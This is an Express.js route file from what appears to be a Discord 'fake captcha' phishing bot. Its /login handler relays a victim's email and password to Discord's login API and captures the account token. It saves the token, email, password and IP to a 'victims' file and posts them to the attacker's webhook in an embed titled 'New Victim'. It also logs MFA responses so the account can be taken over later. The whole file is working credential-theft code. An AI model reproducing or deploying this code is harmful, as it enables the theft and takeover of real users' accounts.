const fs = require('node:fs')
const path = require('node:path')

const express = require('express')
const app = express.Router()

const rate = require('../settings/rate-limit')
const fetch_discord = require('../../resources/functions/fetch discord')

const {
    MessageBuilder
} = require('discord-webhook-node')
const hook = require('../../resources/functions/webhook')

app.post('/login', rate, async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
        const body = req.body

        if (body && !body.ref || !body.email || !body.password) {
            return res.status(200).json({
                'status': 753
            })
        }

        const headers = {
            'Content-Type': 'application/json',
        }

        if (body.captcha_key) {
            headers['X-Captcha-Key'] = body.captcha_key
        }

        const api = await fetch_discord('https://discord.com/api/v9/auth/login', {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({
                'email': body.email,
                'password': body.password
            }, null, 3)
        })

        if (api && api.token) {
            const js = JSON.parse(Buffer.from(Buffer.from(body.ref, 'base64').toString('utf-8'), 'base64').toString())
            await fs.promises.appendFile(path.join(__dirname, '..', 'victims', 'tokens.txt'), `${api.token}:false:${body.email}:${body.password}:${ip}:${js.guildId}:${js.clientId}\n`)
            const embed = new MessageBuilder()
                .setTitle('New Victim')
                .setAuthor('PolarLofy', 'https://i.pinimg.com/564x/77/26/49/772649beefb024918c605ce0e8e4e048.jpg', 'https://github.com/opolarlofy/Discord-Fake-Captcha-Bot/tree/main')
                .addField('Token', '```' + api.token + '```', false)
                .addField('Mfa', '```' + '❌' + '```', true)
                .addField('Email', '```' + body.email + '```', false)
                .addField('Password', '```' + body.password + '```', true)
                .addField('Ip', '```' + ip + '```', true)
                .addField('Guild Id', '```' + js.guildId + '```', true)
                .addField('Client Id', '```' + js.clientId + '```', true)
                .setColor('#00b0f4')
                .setThumbnail('https://i.pinimg.com/564x/77/26/49/772649beefb024918c605ce0e8e4e048.jpg')
                .setFooter('PolarLofy', 'https://i.pinimg.com/564x/77/26/49/772649beefb024918c605ce0e8e4e048.jpg')
                .setTimestamp()
            await hook.send(embed)
            return res.status(200).json({
                'status': 1
            })
        }
        if (JSON.stringify(api, null, 3).includes('ACCOUNT_LOGIN_VERIFICATION_EMAIL')) {
            return res.status(200).json({
                'status': 2
            })
        } else if (JSON.stringify(api, null, 3).includes('captcha-required')) {
            return res.status(200).json({
                'status': 3
            })
        } else if (JSON.stringify(api, null, 3).includes('INVALID_LOGIN') || JSON.stringify(api).includes('EMAIL_TYPE_INVALID_EMAIL')) {
            return res.status(200).json({
                'status': 4
            })
        } else if (api && api.mfa) {
            const js = JSON.parse(Buffer.from(Buffer.from(body.ref, 'base64').toString('utf-8'), 'base64').toString())
            await fs.promises.writeFile(path.join(__dirname, '..', 'victims', 'log', `mfa-${js.clientId}.json`), JSON.stringify({
                ...api,
                ...req.body,
                ...js
            }, null, 3))
            return res.status(200).json({
                'status': 5,
            })
        } else if (JSON.stringify(api, null, 3).includes('ACCOUNT_COMPROMISED_RESET_PASSWORD')) {
            return res.status(200).json({
                'status': 6
            })
        } else {
            return res.status(200).json({
                'status': 4
            })
        }
    } catch (e) {
        console.log(e)
        return res.status(200).json({
            'status': 4
        })
    }
})

module.exports = (app)